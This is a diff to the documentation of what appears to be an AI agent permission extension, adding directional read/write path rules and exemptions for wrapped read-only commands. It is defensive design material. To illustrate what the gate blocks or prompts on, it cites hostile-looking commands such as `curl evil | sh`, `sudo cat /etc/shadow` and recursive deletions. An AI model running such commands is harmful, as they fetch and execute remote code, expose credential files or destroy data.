@@ -227,7 +227,7 @@ Three invariants govern the chain:
 3. **Registration alone grants no authority.**
    Installing a judge extension gives it nothing; a link decides nothing until you name it here (opt-in activation).
 
-The chain owner caps every link with a **bounded-delegation checkpoint**: a link's `allow` on an excluded surface (`external_directory` or the `path` surface) is downgraded to `defer`, so a buggy or over-eager judge can never approve access outside your policy.
+The chain owner caps every link with a **bounded-delegation checkpoint**: a link's `allow` on an excluded surface *family* (`external_directory` or `path`, including each family's directional members) is downgraded to `defer`, so a buggy or over-eager judge can never approve access outside your policy.
 Deny and defer are never capped.
 The excluded surface is the **gate** surface the rule fired on, not the tool name displayed in the prompt — so a `write` blocked by a `path` rule is capped.
 This holds for an ask forwarded up from a subagent exactly as it does for a local one.
@@ -426,7 +426,8 @@ The bash gate fails closed: when in doubt it blocks or prompts, never silently a
   So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
 - An indirection wrapper — `sudo`, `env`, `xargs`, `time`, `nohup`, `timeout`, `nice`, `parallel`, `rust-parallel`, `rush`, `doas`, `setsid`, `stdbuf`, `watch`, `flock`, or `find`/`fd` carrying a per-result exec flag (`find` with `-exec`/`-execdir`/`-ok`/`-okdir`, `fd` with `-x`/`--exec`/`-X`/`--exec-batch`) — runs a following command that a rule on the wrapper text would otherwise never gate, so its decision is floored the same way (the synthetic `<indirection-bash-wrapper>` pattern in the review log).
   So `sudo aws s3 rm s3://bucket` prompts rather than riding an `aws *: allow`, while a bare `find . -name '*.py'` search (no exec flag) is unaffected.
-  As with the opaque floor, no rule can auto-allow a wrapper: an `allow` is clamped to `ask`, and an explicit `deny` still denies.
+  An `allow` is clamped to `ask`, and an explicit `deny` still denies.
+  The one exception is a wrapper running a [pure-reader command](#wrapper-transparency), whose direction is provable however unknown its argument feed is.
 
 Every synthetic `ask` above — the unparseable sentinel and both wrapper floors — is auto-approved under `yoloMode: true`, which is an explicit full-permissive opt-in rather than a rule that could ride through.
 An explicit `deny` still denies under yolo, and with yolo off the floors are unaffected.
@@ -698,6 +699,182 @@ The `external_directory` and `path` gates interpret bash tokens accordingly (too
 
 To allow-list such a path, write the rule using the path as typed — for example `external_directory: { "/tmp/*": "allow" }` — and the Windows separator folding above makes the forward-slash rule match the Git Bash token.
 
+### Directional Path Surfaces
+
+The `path` and `external_directory` surfaces each carry a **direction**, so a policy can permit reading somewhere without permitting writing there.
+Four keys express it:
+
+| Key                        | Governs                                                      |
+| -------------------------- | ------------------------------------------------------------ |
+| `path_read`                | Reading a file, by path pattern, across all path-aware tools |
+| `path_write`               | Writing a file, by path pattern, across all path-aware tools |
+| `external_directory_read`  | Reading a path outside the working directory                 |
+| `external_directory_write` | Writing to a path outside the working directory              |
+
+The two directions are **independent**, not tiers.
+An `allow` on `path_write` does not grant reading, and a `deny` on `path_read` does not restrict writing.
+Each direction is decided on its own surface and composed with the others by the usual most-restrictive-wins rule.
+
+#### Bare `path` and `external_directory` are sugar
+
+A bare key expands at load into both of its directional keys.
+These two configs mean exactly the same thing:
+
+```jsonc
+{ "permission": { "path": { "*": "ask", "~/.ssh/*": "deny" } } }
+```
+
+```jsonc
+{
+  "permission": {
+    "path_read": { "*": "ask", "~/.ssh/*": "deny" },
+    "path_write": { "*": "ask", "~/.ssh/*": "deny" }
+  }
+}
+```
+
+So every config written before this feature existed keeps its exact meaning, and nothing prompts differently on upgrade.
+Bare `path` remains valid and idiomatic indefinitely — it is the right spelling whenever direction does not matter, which is most of the time.
+
+When a bare key and a directional key are both present, the **sugar-derived entries come first and the explicit directional entries append after them**, whatever order the keys appear in the file.
+Since rules are last-match-wins, the explicit entry always has the final say, and a config and its key-order-swapped twin mean the same thing.
+
+#### Which direction is a given access?
+
+A tool's identity establishes its direction, and on the bash surface a redirect operator or a known read-only command word can establish it too:
+
+| Access                                                                     | Consults                  |
+| -------------------------------------------------------------------------- | ------------------------- |
+| `read`, `grep`, `find`, `ls`                                               | the `_read` surface only  |
+| `write`                                                                    | the `_write` surface only |
+| `edit`                                                                     | both, most-restrictive    |
+| An MCP tool or extension tool                                              | both, most-restrictive    |
+| A bash output redirect destination (`>`, `>>`, `>\|`, `&>`)                | the `_write` surface only |
+| A bash input redirect destination (`<`, `<<<`)                             | the `_read` surface only  |
+| An argument of a [pure-reader core](#the-pure-reader-command-core) command | the `_read` surface only  |
+| Any other bash path token                                                  | both, most-restrictive    |
+
+An access whose direction cannot be established consults **both** surfaces and takes the more restrictive answer.
+That is deliberate: an unproven access is never treated as the narrower one.
+
+Attribution is per **token**, not per command, so one invocation can do both: in `cat notes.md > /backup/notes.md`, `notes.md` is a read and `/backup/notes.md` is a write.
+A redirect operator's proof is absolute — it overrides whatever the command in front of it proved, because `> out.txt` writes `out.txt` however read-only that command is.
+When the same path is reached twice with disagreeing directions (`cat a.txt > a.txt`), the two fold to unproven, which consults both surfaces.
+
+#### The pure-reader command core
+
+A small, frozen set of command words is read-only for any arguments, in any implementation.
+A path token owned by one of them consults the `_read` surface alone:
+
+<!-- BEGIN PURE_READER_CORE -->
+
+`basename`, `cat`, `cd`, `diff`, `dirname`, `echo`, `egrep`, `fd`, `fgrep`, `find`, `grep`, `head`, `ls`, `pwd`, `realpath`, `rg`, `sort`, `stat`, `tail`, `wc`, `which`
+
+<!-- END PURE_READER_CORE -->
+
+The bar for admission is structural, not popularity: implementation-independent read-only-ness across GNU and BSD alike, no option that redirects output to a file, and effects that do not depend on argument content.
+`awk` and `sed` are excluded because their program text and `-i` flag can write; `uniq`, `tee`, `dd`, and `split` each have a positional or option that writes a file; `file` is excluded because `-C`/`--compile` writes a `magic.mgc` file; `less` and `more` can escape to a shell; `git`, `pnpm`, and `node` are subcommand-dependent.
+
+Three members are read-only **until an argument says otherwise**, and naming one of these options withdraws the claim — the token falls back to consulting both surfaces:
+
+| Command | Withdrawn by                                                                                |
+| ------- | ------------------------------------------------------------------------------------------- |
+| `find`  | `-exec`, `-execdir`, `-ok`, `-okdir`, `-delete`, `-fprint`, `-fprint0`, `-fprintf`, `-fls`  |
+| `fd`    | `-x`, `-X`, `--exec`, `--exec-batch`                                                        |
+| `sort`  | `-o`, `--output`                                                                            |
+
+A long option is matched by any unambiguous abbreviation too (`sort --out=…` withdraws the claim exactly as `--output` does), and a short letter is matched anywhere in a cluster (`-uo`) or with its value attached (`-o/tmp/x`).
+
+A core word counts only as a **bare basename**.
+`./grep`, `/usr/bin/grep`, and `bin\grep` name programs this audit never saw, so they prove nothing and consult both surfaces.
+
+The core cannot be extended or removed from configuration.
+If you do not trust a member of it, deny or ask on the paths themselves — an effect proof only chooses which surface answers, and never overrides the answer.
+
+#### Wrapper transparency
+
+The [indirection-wrapper floor](#fail-closed-behavior) exists because a wrapper hides the command that should be gated.
+For one class the hiding is immaterial: a pure-reader command is read-only for **any** arguments, so `xargs grep -l foo` is provably a read even though what `xargs` feeds it is unknowable.
+The floor guards unknowability of *scope*, and scope stays the path surfaces' job — for a wrapped command exactly as for a bare one.
+
+Such a unit is therefore **not** floored.
+It resolves by the inner command's own `bash` rules instead, and the review log records `floorExemption: "core-reader"` beside the rule that decided, so an allow the floor would once have prompted for is auditable to the reason that let it through.
+
+All four of these must hold, and each is a way the floor's reason could still apply:
+
+1. The unit is an indirection wrapper.
+   An `sh -c`/`eval` payload is not one — see below.
+2. The command it runs can be established without passing through an inline shell.
+3. That command **proves** a read: a bare-basename core word with no option that withdraws the claim.
+   So `xargs sort -o /tmp/x` and `xargs find . -delete` stay floored, and so does `xargs ./grep foo`.
+4. The enclosing statement provably writes no file through a redirect.
+   A destination the parse cannot resolve — `> $OUT`, `> $(mktemp)` — counts against the exemption rather than for it.
+
+So `xargs grep -l foo`, `xargs wc -l`, and `find . -name '*.ts' -exec cat {} +` stop prompting under a matching `bash` allow, while `xargs rm`, `xargs sed -i`, `time pnpm test`, and `find . -exec sh -c '…' \;` still prompt.
+
+Three things this does **not** change:
+
+- An explicit `deny` or `ask` on the wrapper is never weakened.
+  Only a unit whose own text already resolved to `allow` is affected, so `bash: {"xargs *": "ask"}` still asks.
+- A `deny` on the inner command now reaches the wrapper.
+  Under `bash: {"*": "allow", "grep *": "deny"}`, `xargs grep foo` is denied rather than merely prompted.
+- Path gating is untouched.
+  The exemption decides the `bash` surface only, and every path token the command projects still goes through `path` and `external_directory` with the direction its command proved.
+  Clause 4 is what keeps that from being a weaker promise than it sounds: a redirect destination the parse cannot resolve (`> $OUT`, `> $(mktemp)`) is not projected onto those surfaces either, so the wrapper keeps its floor rather than relying on a gate that would not see the write.
+
+A user `commandEffects` declaration participates in effect classification but does **not** lift the floor.
+The core's argument-independence is audited here; a claim about a wrapped command is not, and a wrong claim behind a wrapper fails open.
+
+`sudo` and `doas` are ordinary wrappers to this rule.
+The path surfaces gate `sudo cat /etc/shadow` exactly as they gate `cat /etc/shadow`, so nothing about the *file set* changes — what `sudo` adds is that the operating system would have refused, which this extension has never modelled.
+If you run a permissive `bash` policy and want privilege elevation to prompt regardless, say so directly:
+
+```jsonc
+{
+  "permission": {
+    "bash": {
+      "*": "allow",
+      "sudo *": "ask",
+      "doas *": "ask"
+    }
+  }
+}
+```
+
+That rule matches the wrapper's own text, so it is decided before the exemption is ever consulted.
+
+#### Which key to actually write
+
+The useful *grants* are `*_read: allow` and the bare sugar key.
+
+```jsonc
+{
+  "permission": {
+    "external_directory": { "*": "ask" },
+    "external_directory_read": { "~/dev/*": "allow" }
+  }
+}
+```
+
+A `read` of `~/dev/x` is silent; a `write` or `edit` of the same path still prompts.
+Granting an external root takes one line in one surface — no parallel `path_read` entry is needed, because the `path` family only speaks when one of its own patterns matches.
+
+`*_write` earns its keep as a **restriction** far more than as a grant.
+`path_write: { "*": "deny" }` is a coherent read-only-agent posture.
+
+A `*_write: allow` on its own does not silence an `edit`, which also reads — grant the read direction too, or use the bare key.
+
+A key that looks directional but is misspelled (`path_wrote`, `external_directory_reed`) is rejected when the config loads, rather than sitting inert.
+That matters most for a restriction: a misspelled *grant* merely produces more prompts, but a misspelled *deny* would enforce nothing at all.
+
+#### What you will see change
+
+Prompts, the review log, and the `permissions:decision` event now name the directional surface that decided — `path_read` rather than `path` — when the tool's identity proved a direction.
+`/permission-system show` likewise lists the expanded directional rules for a config written with a bare key, so the display matches what is enforced.
+
+One cross-version note for subagent permission forwarding: a child running a newer version sends a directional surface to a parent running an older one, which has no such rules and falls back to its default — more prompting, never less.
+Upgrade the parent session to match.
+
 ### Home Directory Expansion in Patterns
 
 Pattern keys in any permission surface can start with `~/`, `$HOME/`, or `${HOME}/` (or be exactly `~`, `$HOME`, or `${HOME}`).
@@ -903,12 +1080,14 @@ Four existing behaviors keep this allowlist safe — you do not have to enumerat
    That is why this recipe ships with `write` and `edit` denied and a `path` deny block for sensitive files.
    Keep the `path` surface locked down for anything you would not want an allowed read command to overwrite via `>`.
 2. **`find`/`fd` with an exec flag are floored to `ask`.**
-   A bare `find *` search is read-only, so it is safe to allow; the moment an exec flag appears (`find -exec`/`-execdir`/`-ok`/`-okdir`, `fd -x`/`-X`), the [indirection-wrapper floor](#fail-closed-behavior) clamps the decision back to `ask`.
-   So `find . -type f -exec rm {} +` still prompts even under `find *: allow`.
+   A bare `find *` search is read-only, so it is safe to allow; the moment an exec flag appears (`find -exec`/`-execdir`/`-ok`/`-okdir`, `fd -x`/`-X`), the [indirection-wrapper floor](#fail-closed-behavior) clamps the decision back to `ask` — unless the command it runs is itself a pure reader ([wrapper transparency](#wrapper-transparency)), in which case that command's own rule decides.
+   So `find . -type f -exec rm {} +` still prompts even under `find *: allow`, while `find . -type f -exec cat {} +` is decided by the `cat *` rule this recipe already grants.
+   The same options — plus `find -delete`/`-fprint`/`-fprint0`/`-fprintf`/`-fls` and `fd --exec`/`--exec-batch` — also withdraw the [pure-reader claim](#the-pure-reader-command-core) on that command's path tokens, so they stop resolving on the `_read` surface alone.
 3. **Chained commands resolve most-restrictive.**
    `find . -name '*.log' && rm -f found.log` decomposes into `find …` and `rm …`; `rm` matches only `"*": "ask"`, and the most restrictive result governs the whole invocation, so the chain prompts.
 4. **Wrappers cannot ride the allowlist.**
-   `sudo grep …`, `env X=1 cat …`, `sh -c "…"`, and `eval "…"` are floored to `ask` (the [wrapper floors](#fail-closed-behavior)), so an allowed command cannot be smuggled past through a wrapper.
+   `sudo aws …`, `env X=1 npm …`, `sh -c "…"`, and `eval "…"` are floored to `ask` (the [wrapper floors](#fail-closed-behavior)), so a command this recipe does not allow cannot be smuggled past through a wrapper.
+   The wrapper text is what a rule matches, so `sudo grep foo` matches only `"*": "ask"` here and prompts on that rule rather than on the floor — add `"sudo *": "ask"` if you want that stated in the config rather than inherited from the fallback.
 
 `git` is enumerated by read subcommand rather than a broad `git *`, because `git` has mutating subcommands (`commit`, `push`, `branch -D`, `remote add`, `config <key> <value>`).
 Exact patterns like `git status` and `git branch` match only their literal form, so `git branch -D feature` falls through to `"*": "ask"`.
